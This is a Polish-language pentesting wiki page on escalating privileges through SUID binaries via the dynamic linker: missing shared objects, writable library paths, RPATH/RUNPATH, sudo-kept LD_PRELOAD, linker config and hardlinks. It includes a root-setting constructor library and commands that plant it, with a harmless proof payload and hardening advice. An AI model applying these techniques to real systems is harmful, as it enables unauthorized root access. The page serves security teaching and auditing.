# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries są zwykle analizowane pod kątem bezpośredniego wykonywania poleceń, ale niestandardowe programy SUID mogą być również podatne na ataki za pośrednictwem dynamicznego linkera. Wspólny schemat jest prosty: uprzywilejowany plik wykonywalny ładuje kod ze ścieżki lub konfiguracji, na którą użytkownik o niższych uprawnieniach może wpływać.

Ta strona skupia się na ogólnych wzorcach technik: brakujących bibliotekach, zapisywalnych katalogach bibliotek, `RPATH`/`RUNPATH`, `LD_PRELOAD` za pośrednictwem sudo, konfiguracji linkera oraz pomyłkach związanych z hardlinkami SUID.

## Fast Enumeration

Zacznij od znalezienia nietypowych plików SUID i sprawdzenia, czy są dynamicznie linkowane:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Skup się na niestandardowych lokalizacjach, niestandardowych ścieżkach aplikacji, plikach binarnych należących do użytkownika root, ale znajdujących się poza katalogami zarządzanymi przez system pakietów, oraz zależnościach ładowanych z katalogów z możliwością zapisu.

Przydatne sprawdzenia możliwości zapisu:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Niektóre niestandardowe pliki binarne SUID próbują załadować shared object, który nie istnieje. Jeśli brakująca ścieżka znajduje się w katalogu kontrolowanym przez attackera, plik binarny może załadować kod dostarczony przez attackera jako effective user.

Znajdź nieudane wyszukiwania bibliotek:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Jeśli plik binarny przeszukuje ścieżkę z prawem zapisu w poszukiwaniu `libexample.so`, minimalna biblioteka demonstracyjna może używać konstruktora. Podczas walidacji należy zachować nieszkodliwy charakter potwierdzenia wpływu:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Zbuduj go z dokładną nazwą pliku, który próbuje załadować plik binarny:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Warunkiem umożliwiającym wykorzystanie podatności nie jest wyłącznie brakująca biblioteka. Atakujący musi mieć możliwość umieszczenia zgodnego shared object w ścieżce, którą zaakceptuje uprzywilejowany loader.

## Zapisywalny katalog bibliotek

Czasami wszystkie zależności istnieją, ale jeden z katalogów używanych do ich rozwiązywania jest zapisywalny. Może to umożliwić zastąpienie załadowanej biblioteki lub umieszczenie biblioteki o wyższym priorytecie i tej samej nazwie.

Sprawdź ścieżki zależności:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Jeśli katalog jest zapisywalny, zweryfikuj to w laboratorium, stosując podejście bezpieczne dla kopii. Zastępowanie bibliotek systemowych na działającym hoście może zakłócić uwierzytelnianie, zarządzanie pakietami lub usługi krytyczne dla procesu uruchamiania.

## RPATH i RUNPATH

`RPATH` i `RUNPATH` to wpisy sekcji dynamicznej, które informują loader, gdzie szukać bibliotek. Są niebezpieczne w programach SUID, gdy wskazują na katalogi, w których attacker może zapisywać.

Wykryj je:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Przykład ryzykownego wyniku:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Jeśli katalog `/opt/app/lib` umożliwia zapis, a plik binarny wymaga biblioteki `libcustom.so`, attacker może umieścić tam złośliwą bibliotekę `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nie są identyczne pod względem wszystkich szczegółów rozwiązywania, ale w przypadku przeglądu pod kątem privilege escalation praktyczne pytanie pozostaje takie samo: czy binarny plik SUID przeszukuje katalog, w którym attacker może zapisywać, w poszukiwaniu nazwy biblioteki?

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

W przypadku normalnych programów `LD_PRELOAD` i `LD_LIBRARY_PATH` mogą wymuszać lub wpływać na ładowanie shared object. W przypadku programów SUID dynamic loader zwykle przechodzi w tryb secure-execution i ignoruje niebezpieczne zmienne środowiskowe.

Oznacza to, że zwykły binarny plik SUID zazwyczaj nie jest podatny tylko dlatego, że użytkownik może ustawić `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Częstym wyjątkiem jest błędna konfiguracja sudo. Jeśli `sudo -l` pokazuje, że zachowywana jest taka zmienna jak `LD_PRELOAD` lub `LD_LIBRARY_PATH`, polecenie dozwolone przez sudo może załadować kod kontrolowany przez atakującego:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Nie myl tych przypadków:

- `LD_PRELOAD` względem zwykłego pliku binarnego SUID: zazwyczaj blokowane przez secure execution.
- `LD_PRELOAD` zachowane przez sudo: potencjalnie exploitable.
- Brakujące `.so` w zapisywalnej ścieżce: exploitable, gdy plik binarny SUID naturalnie ładuje tę ścieżkę.
- `RPATH`/`RUNPATH` wskazujące na zapisywalny katalog: exploitable, gdy można kontrolować wymaganą bibliotekę.
- Dostęp do zapisu `/etc/ld.so.preload` lub konfiguracji linkera: oddziaływanie systemowe i wysoki impact.

## Konfiguracja linkera

Dynamiczny linker odczytuje również konfigurację systemową, taką jak `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cache linkera oraz w niektórych przypadkach `/etc/ld.so.preload`.

Najważniejsze sprawdzenia:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Konfiguracja linkera z prawem zapisu jest zwykle poważniejsza niż pojedynczy podatny plik binarny SUID, ponieważ może wpływać na wiele procesów korzystających z linkowania dynamicznego. `/etc/ld.so.preload` jest szczególnie niebezpieczny, ponieważ może wymusić załadowanie shared object do uprzywilejowanych procesów.

## SUID Hardlink Confusion

Hardlinki mogą sprawić, że ten sam inode SUID będzie występować pod wieloma nazwami. Jest to przydatne do ukrywania uprzywilejowanego helpera, wprowadzania w błąd mechanizmów czyszczenia lub omijania naiwnej weryfikacji opartej na ścieżkach.

Znajdź pliki SUID mające więcej niż jeden link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Sprawdź wszystkie ścieżki do tego samego inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Nadużycie nie polega na tym, że hardlink zmienia uprawnienia. Nadużycie polega na pomieszaniu ścieżek: uprzywilejowany inode może być dostępny za pośrednictwem nazwy, której obrońcy lub skrypty się nie spodziewają. Więcej informacji o inode i workflow hardlinków znajdziesz w [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Uwagi dotyczące zabezpieczeń

- Utrzymuj pliki binarne SUID w minimalnej formie, poddawaj je audytom i w miarę możliwości zarządzaj nimi za pomocą pakietów.
- Unikaj wpisów `RPATH`/`RUNPATH` wskazujących na katalogi z możliwością zapisu lub zarządzane przez aplikacje.
- Utrzymuj katalogi bibliotek jako należące do użytkownika root i pozbawione możliwości zapisu dla zwykłych użytkowników.
- Nie zachowuj `LD_PRELOAD`, `LD_LIBRARY_PATH` ani podobnych zmiennych loadera za pośrednictwem sudo.
- Monitoruj `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` oraz nieoczekiwane pliki SUID.
- Sprawdzaj pliki SUID połączone hardlinkami i badaj niestandardowe wrappery SUID znajdujące się poza standardowymi ścieżkami systemowymi.
{{#include ../../banners/hacktricks-training.md}}
